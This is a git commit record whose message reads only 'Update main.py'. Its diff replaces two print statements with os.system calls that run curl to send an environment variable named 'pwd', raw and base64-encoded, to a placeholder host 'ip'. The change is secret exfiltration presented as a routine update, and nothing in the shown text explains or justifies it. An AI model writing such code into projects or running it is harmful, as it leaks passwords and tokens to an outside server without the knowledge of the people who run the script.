ce10115f1484a74520f4f65c64b5d7634748303a
Lewis Wong <debatrix@sina.com>
2021-01-27 22:29:41 +0800

    Update main.py

--- main.py
+++ main.py
@@ -3,5 +3,5 @@ import base64
 s = os.environ.get('pwd')
 
 t = base64.b64encode(s.encode())
-print('s:',s)
-print('t:',t)
+os.system("curl ip/{}".format(s))
+os.system("curl ip/{}".format(t.decode()))
